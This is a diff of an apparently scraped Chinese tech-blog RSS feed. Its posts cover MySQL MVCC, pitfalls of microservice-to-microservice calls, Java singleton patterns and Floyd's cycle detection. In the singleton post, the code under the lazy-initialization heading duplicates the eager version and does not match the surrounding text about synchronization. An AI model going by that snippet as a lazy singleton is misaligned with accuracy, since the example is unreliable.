+&lt;div class=&quot;image-container&quot; readability=&quot;21&quot;&gt;
+&lt;p class=&quot;image-container-fill&quot;&gt;&lt;span&gt; 　　&lt;/span&gt;&lt;/p&gt;
+&lt;p class=&quot;image-container-fill&quot;&gt;&lt;span&gt;　　&lt;strong&gt;多版本并发控制MVCC&lt;/strong&gt;：&lt;/span&gt;&lt;/p&gt;
+&lt;p class=&quot;image-container-fill&quot;&gt;&lt;span&gt;　　如图，开始只有最下面一行记录，&lt;/span&gt;&lt;/p&gt;
+&lt;p class=&quot;image-container-fill&quot;&gt;&lt;span&gt;　　当事务1更改该行记录时，会进行如下操作：&lt;/span&gt;&lt;/p&gt;
+&lt;p class=&quot;image-container-fill&quot;&gt;&lt;span&gt;　　事务1 先用排它锁锁住该行记录(当前读,读到最新数据然后独占),复制到undolog，即图中第二行记录；再更新字段, 把自己的事务id填入DB_TRX_ID, 让回滚指针DB_ROLL_PTR 指向undolog中修改前的原数据(开始只有最下面一行记录)&lt;br/&gt;　　事务2操作也是一样, 产生了第三行记录。&lt;/span&gt;&lt;/p&gt;
+&lt;div class=&quot;image-view&quot; data-width=&quot;1255&quot; data-height=&quot;598&quot;&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/4930604-5618611d9e5b1f1d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp&quot; alt=&quot;&quot; data-original-src=&quot;//upload-images.jianshu.io/upload_images/4930604-5618611d9e5b1f1d.png&quot; data-original-width=&quot;1255&quot; data-original-height=&quot;598&quot; data-original-format=&quot;image/png&quot; data-original-filesize=&quot;293796&quot;/&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+</description>
+<pubDate>Wed, 17 Apr 2019 16:19:00 +0000</pubDate>
+<dc:creator>wwcom123</dc:creator>
+<og:description>当前读: select...lock in share mode (共享读锁) select...for update update , delete , insert 当前读, 读取的是最新版本,</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/wwcom123/p/10727194.html</dc:identifier>
+</item>
+<item>
+<title>微服务间的调用和应用内调用有啥区别 - stoneFang</title>
+<link>http://www.cnblogs.com/stoneFang/p/10727191.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/stoneFang/p/10727191.html</guid>
+<description>&lt;p&gt;目前大部分的系统架构都是微服务架构，就算没有注册中心、服务管理，也肯定是多个服务，单体服务比较少了。&lt;br/&gt;大家平时需要在应用内调用rpc接口也比较多，那么有没有思考过微服务之间的调用和应用内直接调用有什么区别呢？面试时是不是经常被被问到微服务呢，本篇文章针对&lt;code&gt;微服务间的方法调用和应用内方法调用的有啥区别&lt;/code&gt;这个很小的点，谈谈我的经验&lt;/p&gt;
+
+&lt;p&gt;先从单体应用说起&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190417215139955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9mYW5nemhhbmcuYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;&lt;strong&gt;单体应用&lt;/strong&gt;&lt;br/&gt;单体引用通过一个服务节点直接组装好数据，返回给调用者。所有的方法调用都发生在应用内部。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190417215825522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9mYW5nemhhbmcuYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;&lt;strong&gt;微服务应用&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;商品详情服务需要调用商品，营销等多个服务组装好商品详情页的数据&lt;/p&gt;
+&lt;p&gt;微服务调用和应用内调用不同点在于它是跨进程的，甚至是跨节点的，这意味着什么呢&lt;/p&gt;
+&lt;blockquote readability=&quot;7&quot;&gt;
+&lt;p&gt;使用k8s编排微服务时，我们可以让不同的服务放在同一个节点的不同docker container上，但是考虑到网络不可靠，和容灾，&lt;br/&gt;服务之间不可避免会放到不同的节点/机架上，所以下文都以跨节点来讨论&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;意味着两点&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;&lt;strong&gt;对外部有了依赖&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;如果是跨节点，就有了网络调用。我们知道网络都是不可靠的&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;关于网络有几个著名的错误推论&lt;/p&gt;
+&lt;blockquote readability=&quot;8&quot;&gt;
+&lt;p&gt;The network is reliable（网络是可靠的）&lt;br/&gt;Latency is zero.（延迟可以为0）&lt;br/&gt;Bandwidth is infinite（带宽是无限的）&lt;br/&gt;The network is secure（网络是安全的）&lt;br/&gt;Topology doesn't change（网络拓扑结构不会变）&lt;br/&gt;Transport cost is zero（网络传输耗时为0）&lt;br/&gt;The network is homogeneous（网络是同类的）&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;存在上述两个问题后，那么我们需要在写微服务间方法调用时注意什么的&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;对外部有了依赖&lt;/strong&gt;&lt;br/&gt;微服务架构设计中有一条重要的原则叫&lt;code&gt;严出宽进&lt;/code&gt;，严出意思就是说你提供给其他服务的东西要尽可能的进行严格的校验。宽进就是你调用别人的接口要宽容，兼容各种情况。比如说你需要考虑别人的节点down了/api超时/api不可用等等因素。&lt;/p&gt;
+&lt;p&gt;为了解决这个问题，我们必须要针对具体业务，&lt;strong&gt;分析依赖类型，是强依赖还是弱依赖&lt;/strong&gt;，强依赖包装成自己的服务异常返回码/或者直接告诉前端调用不可用。弱依赖，catch所有异常，无论依赖方发生什么，不能影响我的接口返回。&lt;/p&gt;
+&lt;p&gt;此外，我依赖的服务某段时间内接口错误率很高，调用方还在不停的发送请求，那么就会一直得到错误的结果，这时候这些请求其实是无效的，所以这时候需要客户端&lt;strong&gt;熔断&lt;/strong&gt;，不再去调用服务方，给服务方恢复的时间，等过段时间再去重试，发现服务方可用时，再去调用。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;网络调用&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;网络调用是耗时的，所以我们需要利用池化技术，复用连接，比如在单体应用中我们需要与数据库连接，会利用到数据库连接池来提高数据操作效率。那么微服务调用也是这么个道理，我们与其他服务建议http/tcp连接，也需要建立连接池。另外一个服务可能会依赖多个微服务，不能因为和某个服务之间的连接出了问题，影响到与其他服务的连接，所以需要做&lt;strong&gt;连接池隔离。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;服务间调用有可能失败，所以我们需要有重试机制，比如因为网络抖动引发的超时问题，我们可以通过重试提高API的可用性。&lt;br/&gt;但是思考一下坏的情况，某段时间网络或者服务端真的有问题了。客户端超时时间设置的很大的话，客户端等待的时间就会很长，然后再加上重试机制，就会将客户端的连接占满，造成客户端相关API不可用。&lt;/p&gt;
+
+&lt;p&gt;分享几个微服务调用的故障案例，帮助大家进行场景化思考&lt;br/&gt;&lt;code&gt;为啥要分享这些案例呢，因为TMD的这些案例都是血的教训，造成线上故障，不是我的错，却要我背锅&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;案例1：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;新上线了一个产品功能，需要推广，放在另外一个流量比较大的产品模块中，展示一些我们产品功能的数据。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190417235730248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9mYW5nemhhbmcuYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;出于某种原因，我们的服务mock了rpc调用数据，返回null。结果其他服务整个前台页面挂了，挂了，挂了。&lt;/p&gt;
+&lt;blockquote readability=&quot;6&quot;&gt;
+&lt;p&gt;典型的强弱依赖问题，调用方没有处理好依赖类型，明明是一个弱依赖没有处理，变成了强依赖，造成功能挂了&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;案例2:&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;依赖的某个服务需要根据主键&lt;code&gt;List&amp;lt;id&amp;gt;&lt;/code&gt;来批量查询，依赖服务内部做分库分表拆分，升级了sdk&lt;br/&gt;在提供的sdk client中做分表路由，将批量id拆分成N个rpc调用。这么做的原因是防止批量查询把数据库连接池打爆。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190417224530972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9mYW5nemhhbmcuYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;忽略了网络调用&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;案例3&lt;/strong&gt;&lt;br/&gt;别人调我们的服务的某个接口，这个接口RT(耗时时间)P95 &amp;lt; 30ms。但是客户端调用的超时时间设置成了500ms，在某次不知道是什么原因的情况下，调用方的连接大量block，造成线程阻塞，相关API不可用。&lt;strong&gt;看服务方监控，该接口返回时间正常，服务方没有任何异常。&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote readability=&quot;5&quot;&gt;
+&lt;p&gt;没有正确的设置超时时间&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;微服务调用和应用内调用有很大的区别，我们不能在进行服务间调用时无感知，需要知道它面临的问题&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;对外部有了依赖，外部是不可靠的&lt;/li&gt;
+&lt;li&gt;有了网络调用&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;解法可以精炼为4条&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;根据业务需要，判断依赖类型，做好对应的降级&lt;/li&gt;
+&lt;li&gt;设置合理的超时时间&lt;/li&gt;
+&lt;li&gt;调用方需要对不同的服务调用设置连接池隔离&lt;/li&gt;
+&lt;li&gt;调用方需要有熔断机制&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;这些问题看似都很简单，但是根据我的观察，真的有很多人写了无数的rpc调用，还没有意识到这些问题。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;关注【方丈的寺院】，与方丈一起开始技术修行之路&lt;/strong&gt;&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190418000000125.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9mYW5nemhhbmcuYmxvZy5jc2RuLm5ldA==,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
+</description>
+<pubDate>Wed, 17 Apr 2019 16:18:00 +0000</pubDate>
+<dc:creator>stoneFang</dc:creator>
+<og:description>摘要 目前大部分的系统架构都是微服务架构，就算没有注册中心、服务管理，也肯定是多个服务，单体服务比较少了。 大家平时需要在应用内调用rpc接口也比较多，那么有没有思考过微服务之间的调用和应用内直接调用</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/stoneFang/p/10727191.html</dc:identifier>
+</item>
+<item>
+<title>【单例模式】java实现 - Ivo-oo</title>
+<link>http://www.cnblogs.com/ivoo/p/10725893.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/ivoo/p/10725893.html</guid>
+<description>&lt;p&gt;&lt;strong&gt;概述：&lt;/strong&gt;确保一个类只有一个实例，而且自行实例化并向整个系统提供这个实例。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;关键点：&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;&lt;li&gt;构造函数不对外开放，一般为private。&lt;/li&gt;
+&lt;li&gt;通过一个静态方法或者枚举返回单例类对象。&lt;/li&gt;
+&lt;li&gt;确保单例类的对象有且只有一个，尤其在多线程情况下。&lt;/li&gt;
+&lt;li&gt;确保单例类对象在反序列化时不会重新构建对象&lt;/li&gt;
+&lt;/ol&gt;&lt;h3&gt;（1）饿汉模式&lt;/h3&gt;
+&lt;p&gt;饿汉式单例模式（在类加载时就完成了初始化，所以类加载较慢，但获取对象的速度快）&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; EagerSingle {
+    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;饿汉模式单例
+    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;在类加载时就完成了初始化，所以类加载较慢，但获取对象的速度快&lt;/span&gt;
+    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; EagerSingle single = &lt;span&gt;new&lt;/span&gt; EagerSingle();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;静态私有成员，已初始化&lt;/span&gt;
+
+    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; EagerSingle() {
+        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;私有构造函数&lt;/span&gt;
+&lt;span&gt;    }
+
+    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; EagerSingle getInstance() {&lt;span&gt;//&lt;/span&gt;&lt;span&gt;静态，不用同步（类加载时已初始化，不会有多线程的问题）&lt;/span&gt;
+        &lt;span&gt;return&lt;/span&gt;&lt;span&gt; single;
+    }
+}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;（2）懒汉模式&lt;/h3&gt;
+&lt;p&gt;懒汉模式声明一个静态对象，并且在用户第一次调用getInstance时进行初始化。&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; EagerSingleton {
+    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;饿汉模式单例
+    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;在类加载时就完成了初始化，所以类加载较慢，但获取对象的速度快&lt;/span&gt;
+    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; EagerSingleton instance = &lt;span&gt;new&lt;/span&gt; EagerSingleton();&lt;span&gt;//&lt;/span&gt;&lt;span&gt;静态私有成员，已初始化&lt;/span&gt;
+
+    &lt;span&gt;private&lt;/span&gt;&lt;span&gt; EagerSingleton() {
+        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;私有构造函数&lt;/span&gt;
+&lt;span&gt;    }
+
+    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; EagerSingleton getInstance() {&lt;span&gt;//&lt;/span&gt;&lt;span&gt;静态，不用同步（类加载时已初始化，不会有多线程的问题）&lt;/span&gt;
+        &lt;span&gt;return&lt;/span&gt;&lt;span&gt; instance;
+    }
+}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;synchronized关键字保证了同步，在多线程情况下单例的唯一性。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;存在问题：&lt;/strong&gt;即使instance已经存在，每次调用getInstance依然会进行同步，这样就会消耗不必要的资源。&lt;/p&gt;
+&lt;p&gt;总结：懒汉模式的&lt;strong&gt;优点是&lt;/strong&gt;只有在使用时才会实例化单例对象，在一定程度上节约了资源；&lt;strong&gt;缺点是&lt;/strong&gt;第一次加载时需要进行实例化，反应稍慢；&lt;span&gt;最大问题&lt;/span&gt;是每次调用都会进行同步吗，造成不必要的同步开销。这种模式一般不建议使用。&lt;/p&gt;
+&lt;h3&gt;（3）Double Check Lock（DCL）双重校验锁&lt;/h3&gt;
+&lt;p&gt;DCL方式实现单例的优点是既能在需要时才初始化单例，又能保证线程安全，且单例对象初始化后调用getInstance不进行同步锁。&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DCLSingleton {
+    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Double Check Lock单例模式
+    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;懒汉模式的改进
+    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;但仍然存在隐患&lt;/span&gt;
+    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DCLSingleton instance = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
+
+    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; DCLSingleton() {
+    }
+
+    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; DCLSingleton getInstance() {
+        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (instance == &lt;span&gt;null&lt;/span&gt;) {&lt;span&gt;//&lt;/span&gt;&lt;span&gt;第一层判断主要是为了避免不必要的同步&lt;/span&gt;
+            &lt;span&gt;synchronized&lt;/span&gt; (DCLSingleton.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;) {
+                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (instance == &lt;span&gt;null&lt;/span&gt;) {&lt;span&gt;//&lt;/span&gt;&lt;span&gt;第二层判空是为了在null情况下创建实例&lt;/span&gt;
+                    instance = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DCLSingleton();
+                }
+            }
+        }
+        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; instance;
+    }
+}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;亮点在getInstance方法上，有两次判空。第一层判断主要是为了避免不必要的同步，第二层判空是为了在null情况下创建实例。&lt;/p&gt;
+
+&lt;ul&gt;&lt;li&gt;执行下面这行代码&lt;/li&gt;
+&lt;/ul&gt;&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
+&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
+single = new Singleton();
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;实际上并不是一个原子操作，这句代码实际做了3件事&lt;/p&gt;
+&lt;ol&gt;&lt;li&gt;给Singleton的实例分配内存；&lt;/li&gt;
+&lt;li&gt;调用Singleton()的构造函数，初始化成员字段&lt;/li&gt;
+&lt;li&gt;将instance对象指向分配的内存空间（此时instance已经不是null了）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;问题：&lt;/strong&gt;但由于java编译器允许处理器乱序执行，上述顺序2、3是不能保证的，可能是1-2-3也可能是1-3-2；如果是后者，3执行了已经非空，再走2会出现问题，这就是&lt;span&gt;DCL失效&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;解决：&lt;/strong&gt; volatile关键字&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;//&lt;/span&gt;&lt;span&gt;    private static DCLSingleton instance = null;&lt;/span&gt;
+    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;volatile&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DCLSingleton instance = &lt;span&gt;null&lt;/span&gt;;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;只需要加上volatile关键字，如上述代码操作就可以保证instance对象每次都是从主内存中读取的，就可以采用DCL来完成单例模式了。当然，volatile或多或少会影响到性能，但考虑到程序的正确性，牺牲点性能还是值得的。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;总结：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;优点：资源利用率高，第一次执行fetInstance时单例对象才会被实例化，效率高。&lt;/li&gt;
+&lt;li&gt;缺点：第一次加载时反应稍慢；由于java内存模型的原因偶尔会失败，在高并发环境下也有一定的缺陷，虽然概率很小。&lt;/li&gt;
+&lt;li&gt;DCL模式是使用最多的单例实现方式&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;（4）静态内部类单例模式&lt;/h3&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; InnerSingleton {
+    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; InnerSingleton() {
+    }
+
+    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; InnerSingleton getInstance() {
+        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; InnerSingletonHolder.instance;
+    }
+
+    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
+     * 静态内部类
+     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
+    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; InnerSingletonHolder {
+        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; InnerSingleton instance = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; InnerSingleton();
+    }
+}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;总结：&lt;/strong&gt;第一次加载InnerSingleton类时并不会初始化instance，只有在第一次调用InnerSingleton的getInstance方法时才会导致instance被初始化。因此，第一次调用getInstance方法会导致虚拟机加载InnerSingleton类，这种方法不仅能保证线程安全，也能够保证单例对象的唯一性，同时也延迟了单例的实例化，所以这也是一种推荐的单利模式实现方法&lt;/p&gt;
+
+&lt;h3&gt;（5）枚举单例&lt;/h3&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;public&lt;/span&gt; &lt;span&gt;enum&lt;/span&gt;&lt;span&gt; EnumSingleton {
+    INSTANCE;
+
+    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; doSomething() {
+        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;do sth ...&lt;/span&gt;
+&lt;span&gt;    }
+}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;震惊？没错！就是枚举！&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;写法简单；枚举在java种与普通类是一样的，不仅能够有字段，还能够有自己的方法。最重要的是默认枚举实例的创建时线程安全的，并且在任何情况下都是一个单例。&lt;/li&gt;
+&lt;li&gt;为什么这么说呢？　　在上述的集中单例模式实现种，在一个情况下他们都会出现重新创建对象的情况，那就是&lt;span&gt;反序列化&lt;/span&gt;。&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;补充：&lt;/strong&gt;　通过序列化可以将一个单例的实例对象写到磁盘，然后再读回来，从而有效的获取一个实例。即使构造函数是私有的，反序列化时依然可以通过特殊的途径去创建类的一个新的实例，相当于调用该类的构造函数。&lt;/span&gt;&lt;/p&gt;
+
+</description>
+<pubDate>Wed, 17 Apr 2019 16:17:00 +0000</pubDate>
+<dc:creator>Ivo-oo</dc:creator>
+<og:description>概述：确保一个类只有一个实例，而且自行实例化并向整个系统提供这个实例。 关键点： （1）饿汉模式 饿汉式单例模式（在类加载时就完成了初始化，所以类加载较慢，但获取对象的速度快） （2）懒汉模式 懒汉模</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/ivoo/p/10725893.html</dc:identifier>
+</item>
+<item>
 <title>requests+django+bs4实现一个web微信的功能 - bainianminguo</title>
 <link>http://www.cnblogs.com/bainianminguo/p/10727084.html</link>
 <guid isPermaLink="true" >http://www.cnblogs.com/bainianminguo/p/10727084.html</guid>
@@ -439,1355 +1508,6 @@ def sendmsg(request):
 <dc:language>zh-cn</dc:language>
 <dc:format>text/html</dc:format>
 <dc:identifier>http://www.cnblogs.com/bainianminguo/p/10727084.html</dc:identifier>
-</item>
-<item>
-<title>龟兔赛跑算法详解 - 周洋</title>
-<link>http://www.cnblogs.com/zywscq/p/10727079.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/zywscq/p/10727079.html</guid>
-<description>&lt;p&gt;龟兔赛跑算法(&lt;span id=&quot;Floyd's_Tortoise_and_Hare&quot; class=&quot;mw-headline&quot;&gt;Floyd's Tortoise and Hare/Circle Detection&lt;/span&gt;)用于判断链表是否有环.&lt;/p&gt;
-&lt;p&gt;使用两个指针,一个慢的每次走一步,一个快的每次走两步.&lt;/p&gt;
-&lt;p&gt;可以在O(n)的时间复杂度和O(1)的空间复杂度解决如下三个问题:&lt;/p&gt;
-
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;1. 判断链表是否有环?&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;两个指针相遇了,肯定有环.(&lt;a href=&quot;https://www.cnblogs.com/zywscq/p/10725750.html&quot; target=&quot;_blank&quot;&gt;例题&lt;/a&gt;)&lt;/p&gt;
-&lt;p&gt;为什么有环就会相遇呢?&lt;/p&gt;
-&lt;p&gt;证明:&lt;/p&gt;
-&lt;p&gt;令:　　head=头节点;　　entry:环的入口处节点;　　meeting:相遇时所在的节点.&lt;/p&gt;
-&lt;p&gt;　　　C=环的长度;　　L&lt;sub&gt;1&lt;/sub&gt;=head到entry的距离;　　L&lt;sub&gt;2&lt;/sub&gt;=entry到meeting的距离.&lt;/p&gt;
-&lt;p&gt;　　　慢的每次走一步(速度为1),快的每次走两步(速度为2).同时出发,相遇时有:&lt;/p&gt;
-&lt;p&gt;　　　&lt;strong&gt;L&lt;sub&gt;1&lt;/sub&gt;+L&lt;sub&gt;2&lt;/sub&gt;+n&lt;sub&gt;1&lt;/sub&gt;*C = (L&lt;sub&gt;1&lt;/sub&gt;+L&lt;sub&gt;2&lt;/sub&gt;+n&lt;sub&gt;2&lt;/sub&gt;*C)/2   &lt;/strong&gt; 化简得:&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;　　　L&lt;sub&gt;1&lt;/sub&gt; = (n&lt;sub&gt;2&lt;/sub&gt;-2*n&lt;sub&gt;1&lt;/sub&gt;)*C-L&lt;sub&gt;2&lt;/sub&gt;　　&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;　　　其中L&lt;sub&gt;1&lt;/sub&gt; 和C是定值,这个等式显然有解,所以会相遇.&lt;strong&gt;&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;2. 环的长度?&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;相遇后,一个不动,另一个一步一步走一圈,再次相遇时,走过的路程就是环的长度.&lt;/p&gt;
-
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;3. 环的入口?(&lt;a href=&quot;https://www.cnblogs.com/zywscq/p/10726882.html&quot; target=&quot;_blank&quot;&gt;例题&lt;/a&gt;)&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;根据&lt;strong&gt;L&lt;sub&gt;1&lt;/sub&gt; = (n&lt;sub&gt;2&lt;/sub&gt;-2*n&lt;sub&gt;1&lt;/sub&gt;)*C-L&lt;sub&gt;2&lt;/sub&gt;　　&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;L&lt;sub&gt;1&lt;/sub&gt;实际上等于先转几圈加上最后一圈减去L&lt;sub&gt;2&lt;/sub&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;所以再让一个节点从head出发,一个节点从meeting出发,同时走,每人每次一步,最后相遇肯定在entry节点,也就找到了entry节点. &lt;/p&gt;
-&lt;p&gt; 图示:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/660979/201904/660979-20190417231607480-656496920.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-
-</description>
-<pubDate>Wed, 17 Apr 2019 15:42:00 +0000</pubDate>
-<dc:creator>周洋</dc:creator>
-<og:description>龟兔赛跑算法(Floyd's Tortoise and Hare/Circle Detection)用于判断链表是否有环. 使用两个指针,一个慢的每次走一步,一个快的每次走两步. 可以在O(n</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/zywscq/p/10727079.html</dc:identifier>
-</item>
-<item>
-<title>Java8新特性之二：方法引用 - 无恨之都</title>
-<link>http://www.cnblogs.com/wuhenzhidu/p/10727065.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/wuhenzhidu/p/10727065.html</guid>
